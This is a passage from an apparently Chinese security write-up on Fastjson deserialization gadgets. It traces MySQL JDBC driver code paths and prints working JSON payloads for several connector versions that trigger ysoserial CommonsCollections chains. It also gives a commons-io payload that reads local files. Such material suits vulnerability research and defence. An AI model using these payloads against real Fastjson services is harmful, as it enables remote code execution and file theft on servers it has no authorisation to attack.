class="hljs-string">&quot;ResultSet._while_reading_serialized_object_92&quot;</span>), <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>                    obj = data;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>5.1.41版本后，不再使用getObject()获取”SHOW COLLATION”的结果，此链失效</p>
<p><img src="/image/image-20220916154732110-16633144539751.png" srcset="/img/loading.gif" lazyload alt="image-20220916154732110"></p>
<p>ServerStatusDiffInterceptor链：</p>
<p>ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设置属性queryInterceptors为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法，进而调用 getObject () 方法。</p>
<p>ServerStatusDiffInterceptor#postProcess()方法和populateMapWithSessionStatusValues()方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//执行查询语句自动执行此方法</span><br><span class="hljs-keyword">public</span> ResultSetInternalMethods <span class="hljs-title function_">postProcess</span><span class="hljs-params">(String sql, Statement interceptedStatement, ResultSetInternalMethods originalResultSet, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">if</span> (connection.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.populateMapWithSessionStatusValues(connection, <span class="hljs-built_in">this</span>.postExecuteValues);<br>        connection.getLog().logInfo(<span class="hljs-string">&quot;Server status change for statement:\n&quot;</span> + Util.calculateDifferences(<span class="hljs-built_in">this</span>.preExecuteValues, <span class="hljs-built_in">this</span>.postExecuteValues));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-comment">//执行postProcess()进而执行populateMapWithSessionStatusValues()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">populateMapWithSessionStatusValues</span><span class="hljs-params">(Connection connection, Map&lt;String, String&gt; toPopulate)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        toPopulate.clear();<br>        stmt = connection.createStatement();<br>        rs = stmt.executeQuery(<span class="hljs-string">&quot;SHOW SESSION STATUS&quot;</span>);<br>        Util.resultSetToMap(toPopulate, rs);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) &#123;<br>            rs.close();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (stmt != <span class="hljs-literal">null</span>) &#123;<br>            stmt.close();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>com.mysql.jdbc.Util#resultSetToMap()方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>执行rs.getObject()后执行逻辑与detectCustomCollations链中getObject()执行逻辑相同，进行反序列化</p>
<p>FastJSON-JDBC调用链</p>
<p>如上所述当  JSON串为 {“@type”:”java.lang.AutoCloseable”, “@type”: “com.mysql.jdbc.JDBC4Connection”}会调用至com.mysql.jdbc.JDBC4Connection的构造方法</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs qml">public JDBC4Connection(<span class="hljs-built_in">String</span> hostToConnectTo, <span class="hljs-built_in">int</span> portToConnectTo, Properties info, <span class="hljs-built_in">String</span> databaseToConnectTo, <span class="hljs-built_in">String</span> <span class="hljs-built_in">url</span>) throws <span class="hljs-title">SQLException</span> &#123;<br>    <span class="hljs-keyword">super</span>(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, <span class="hljs-built_in">url</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进而调用com.mysql.jdbc.ConnectionImpl#ConnectionImpl(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url)构造方法中this.createNewIO(false);</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-built_in">this</span>.dbmd = <span class="hljs-built_in">this</span>.getMetaData(<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">this</span>.initializeSafeStatementInterceptors();<br>    <span class="hljs-built_in">this</span>.createNewIO(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">this</span>.unSafeStatementInterceptors();<br></code></pre></td></tr></table></figure>

<p>com.mysql.jdbc.ConnectionImpl#createNewIO(boolean isForReconnect)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNewIO</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isForReconnect)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.getConnectionMutex()) &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">mergedProps</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.exposeAsProperties(<span class="hljs-built_in">this</span>.props);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.getHighAvailability()) &#123;<br>            <span class="hljs-built_in">this</span>.connectOneTryOnly(isForReconnect, mergedProps);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.connectWithRetries(isForReconnect, mergedProps);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用至ConnectionImpl#connectOneTryOnly()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connectOneTryOnly</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isForReconnect, Properties mergedProps)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Exception</span> <span class="hljs-variable">connectionNotEstablishedBecause</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.coreConnect(mergedProps);<br>        <span class="hljs-built_in">this</span>.connectionId = <span class="hljs-built_in">this</span>.io.getThreadId();<br>        <span class="hljs-built_in">this</span>.isClosed = <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">oldAutoCommit</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getAutoCommit();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">oldIsolationLevel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isolationLevel;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">oldReadOnly</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isReadOnly(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">oldCatalog</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getCatalog();<br>        <span class="hljs-built_in">this</span>.io.setStatementInterceptors(<span class="hljs-built_in">this</span>.statementInterceptors);<br>        <span class="hljs-built_in">this</span>.initializePropsFromServer();<br>        <span class="hljs-keyword">if</span> (isForReconnect) &#123;<br>            <span class="hljs-built_in">this</span>.setAutoCommit(oldAutoCommit);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.hasIsolationLevels) &#123;<br>                <span class="hljs-built_in">this</span>.setTransactionIsolation(oldIsolationLevel);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.setCatalog(oldCatalog);<br>            <span class="hljs-built_in">this</span>.setReadOnly(oldReadOnly);<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>        <span class="hljs-keyword">if</span> (!(var8 <span class="hljs-keyword">instanceof</span> SQLException) || ((SQLException)var8).getErrorCode() != <span class="hljs-number">1820</span> || <span class="hljs-built_in">this</span>.getDisconnectOnExpiredPasswords()) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.io != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.io.forceClose();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (var8 <span class="hljs-keyword">instanceof</span> SQLException) &#123;<br>                <span class="hljs-keyword">throw</span> (SQLException)var8;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">SQLException</span> <span class="hljs-variable">chainedEx</span> <span class="hljs-operator">=</span> SQLError.createSQLException(Messages.getString(<span class="hljs-string">&quot;Connection.UnableToConnect&quot;</span>), <span class="hljs-string">&quot;08001&quot;</span>, <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>                chainedEx.initCause(var8);<br>                <span class="hljs-keyword">throw</span> chainedEx;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用至ConnectionImpl#initializePropsFromServer()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializePropsFromServer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">connectionInterceptorClasses</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getConnectionLifecycleInterceptors();<br>    <span class="hljs-built_in">this</span>.connectionLifecycleInterceptors = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (connectionInterceptorClasses != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.connectionLifecycleInterceptors = Util.loadExtensions(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.props, connectionInterceptorClasses, <span class="hljs-string">&quot;Connection.badLifecycleInterceptor&quot;</span>, <span class="hljs-built_in">this</span>.getExceptionInterceptor());<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.setSessionVariables();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.setTransformedBitIsBoolean(<span class="hljs-literal">false</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.parserKnowsUnicode = <span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getUseServerPreparedStmts() &amp;&amp; <span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.useServerPreparedStmts = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &amp;&amp; !<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.useServerPreparedStmts = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    String characterSetResultsOnServerMysql;<br>    String sqlModeAsString;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.loadServerVariables();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.versionMeetsMinimum(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) &#123;<br>            <span class="hljs-built_in">this</span>.autoIncrementIncrement = <span class="hljs-built_in">this</span>.getServerVariableAsInt(<span class="hljs-string">&quot;auto_increment_increment&quot;</span>, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.autoIncrementIncrement = <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.buildCollationMapping();<br>        <span class="hljs-type">int</span> i;<br>        ……<br></code></pre></td></tr></table></figure>

<p>调用至ConnectionImpl#buildCollationMapping()</p>
<p><img src="/image/453d3967-f666-4285-9ca6-cddbf1138006.png" srcset="/img/loading.gif" lazyload alt="image-20220920161458418"></p>
<p>最后调用至ResultSetImpl#getObject()，后进行反序列化造成代码执行。</p>
<p>payload   5.1.11-5.1.48</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CommonsCollections5&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 利用链</span><br>        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;statementInterceptors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="/image/1b038b17-718e-4d17-8c91-0598bb759995.png" srcset="/img/loading.gif" lazyload alt="image-20220920152603206"></p>
<p>payload 6.0.2&#x2F;6.0.3</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,<br>        <span class="hljs-string">&quot;proxy&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;connectionString&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span><br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection构造方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedMySQLConnection</span><span class="hljs-params">(LoadBalancedConnectionProxy proxy)</span> &#123;<br>    <span class="hljs-built_in">super</span>(proxy);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>LoadBalancedConnectionProxy构造方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedConnectionProxy</span><span class="hljs-params">(ConnectionString connectionString)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    ......<br>    <span class="hljs-built_in">this</span>.pickNewConnection();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后用pickNewConnection()建立连接，最终造成反序列化</p>
<p>6.0.4中构造方法改变，此利用链无法使用</p>
<p>payload 8.0.19</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<br>        <span class="hljs-string">&quot;proxy&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<br>            <span class="hljs-string">&quot;connectionUrl&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>,<br>                <span class="hljs-string">&quot;masters&quot;</span>:[&#123;<br>            <span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>        &#125;],<br>        <span class="hljs-string">&quot;slaves&quot;</span>:[],<br>        <span class="hljs-string">&quot;properties&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;yso_CommonsCollections4_calc&quot;</span>,<br>                    <span class="hljs-string">&quot;dbname&quot;</span>:<span class="hljs-string">&quot;dbname&quot;</span>,<br>                    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;pass&quot;</span>,<br>                    <span class="hljs-string">&quot;queryInterceptors&quot;</span>:<span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br>                    <span class="hljs-string">&quot;autoDeserialize&quot;</span>:<span class="hljs-string">&quot;true&quot;</span><br>        	&#125;<br>    	&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h6 id="Gadget2-文件写入读取"><a href="#Gadget2-文件写入读取" class="headerlink" title="Gadget2:文件写入读取"></a>Gadget2:文件写入读取</h6><p>payload如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;abc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">66</span><span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>payload分析：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

